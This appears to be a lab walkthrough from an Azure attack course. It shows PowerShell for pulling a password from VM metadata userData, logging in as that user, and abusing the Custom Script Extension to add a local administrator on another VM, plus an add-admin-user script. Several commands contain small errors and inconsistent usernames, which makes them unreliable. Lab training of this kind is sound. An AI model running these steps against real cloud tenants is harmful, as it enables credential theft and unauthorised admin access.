## Objective 20 ***Part of - Kill Chain - 2***
```
- Using the access to jumpvm VM, extract secrets for samcgray@defcorphq.onmicrosoft.com from user data.
- Abuse Custom Script Extension on infradminsrv VM to execute code on it.
```
- Access with the just added user with [addUser.ps1](#ADD_USER) using PSRemoting.
```powershell
$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('studentx', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
- Check user data used by `jumpvm` and extract it. 
```powershell
$userData = InvokeRestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```
 ![test](/img/obj20a.png "Enumeration")

- Connect with Sam's credentials
```powershell
$password = ConvertTo-SecureString '$7cur7gr@yQamu5913@092' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```
- List accesable Azure resources
```powershell
Get-AzResource
```
 ![test](/img/obj20b.png "Enumeration")

- We listed accessable resources but nothing valid. Request and ***ARM API*** for listing resources permissions
```powershell
$Token = '(Get-AzAccessToken).Token'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
  Method = 'GET'
  Uri = $URI
  Headers = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value
```
The user Sam has both read and write permissions for extensions on infradminsrv. Let's check if any extensions is already installed
 ![test](/img/obj20c.png "Enumeration")
```powershell
Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
```
 ![test](/img/obj20d.png "Enumeration")

- When we checked Sam has a write extension permissions on the VM so we can abuse ***the custom script extension***
  Following permissions are required to create a custom script extension and read the output
  - `Microsoft.Compute/virtualMachines/extensions/write`
  - `Microsoft.Compute/virtualMachines/extensions/read`

```powershell
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users studentx StudxPassword@123 /add /Y; net localgroup administrators studentx /add"}'
```
 ![test](/img/obj20e.png "Enumeration")

- Use PSRemoting to connect to jumpvm and from the remoting session to infradminsrv
```powershell
$password = ConvertTo-SecureString 'Stud1Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student1', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```
 ![test](/img/obj20f.png "Enumeration")














# ADD_USER
- ***`adduser.ps1`***
  ```powershell
  # adduser.ps1 script

  $passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
  New-LocalUser -Name studentX -Password $passwd
  Add-LocalGroupMember -Group Administrators -Member studentx
  ```

